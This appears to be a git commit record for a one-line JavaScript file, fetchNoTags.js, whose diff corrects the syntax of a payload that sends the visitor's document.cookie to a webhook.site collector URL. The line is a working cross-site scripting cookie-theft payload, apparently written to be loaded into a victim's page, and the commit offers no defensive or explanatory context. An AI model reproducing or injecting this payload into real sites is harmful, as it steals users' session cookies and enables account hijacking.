e4255b2e7c1d41fa9232a996dcdfa388a639755c
JASalgueiro <74070951+JASalgueiro@users.noreply.github.com>
2022-12-16 23:55:50 +0000

    Update fetchNoTags.js

--- fetchNoTags.js
+++ fetchNoTags.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='+document.cookie')
+fetch('https://webhook.site/225ae295-bbd0-4fb7-865d-4e3edef7e5b8?cookie='+document.cookie');
